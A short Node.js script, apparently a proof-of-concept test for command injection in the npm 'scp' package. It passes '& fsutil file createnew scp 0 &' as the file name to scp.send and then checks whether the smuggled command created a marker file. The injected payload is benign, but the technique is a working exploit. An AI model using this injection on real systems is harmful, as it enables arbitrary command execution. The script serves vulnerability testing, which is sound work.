Reflect.getPrototypeOf = () => false;
const scp = require('scp');
const fs = require('fs');
const path = './scp';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
let options = {
    file: '& fsutil file createnew scp 0 &',
    user: 'username',
    host: 'myServer',
    port: '20',
    path: '~'
};
scp.send(options, function (err) {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
});